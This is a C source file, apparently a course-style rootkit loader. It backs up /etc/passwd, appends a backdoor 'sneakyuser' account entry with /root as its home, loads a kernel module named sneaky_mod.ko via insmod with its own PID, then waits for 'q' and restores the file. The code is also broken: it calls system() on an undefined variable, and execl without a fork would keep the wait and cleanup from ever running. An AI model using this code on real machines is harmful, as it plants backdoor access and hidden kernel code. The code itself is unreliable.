#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void print_pid()
{
    printf("sneaky_process pid = %d\n", getpid());
}

void insert_sneaky_mod(int sneaky_pid) {
  char sneaky_pid_str[100];
  snprintf(sneaky_pid_str, sizeof(sneaky_pid_str), "sneaky_pid=%d", sneaky_pid);
  execl("/sbin/insmod", "insmod", "sneaky_mod.ko", sneaky_pid_str, NULL);
  system(arg);
}

void waitq() {
  char c;
  while ((c = getchar()) != 'q') {
  }
}

int main() {
  print_pid();
  // Step 1: Copy /etc/passwd to /tmp/passwd
  system("cp /etc/passwd /tmp/passwd");
  // Step 2: Add sneakyuser entry to /etc/passwd
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
  // Step 3: load the sneaky module
  insert_sneaky_mod(getpid());
  // Step 4: wait for 'q'
  waitq();
  // Step5: 
  system("rmmod sneaky_mod.ko");
  system("cp /tmp/passwd /etc/passwd");
  system("rm /tmp/passwd");

  return EXIT_SUCCESS;
}